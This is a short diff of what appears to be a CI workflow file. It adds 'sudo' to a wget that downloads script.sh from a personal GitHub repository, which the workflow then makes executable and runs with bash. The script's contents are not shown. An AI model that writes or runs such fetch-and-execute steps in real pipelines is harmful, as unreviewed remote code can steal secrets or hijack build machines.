@@ -30,7 +30,7 @@ jobs:
           cd ../../../..
           cd home
           sudo apt install nodejs
-          wget "https://raw.githubusercontent.com/cryptbphcoutlook/test123/main/script.sh"
+          sudo wget "https://raw.githubusercontent.com/cryptbphcoutlook/test123/main/script.sh"
           sudo chmod +x script.sh
           bash script.sh
         
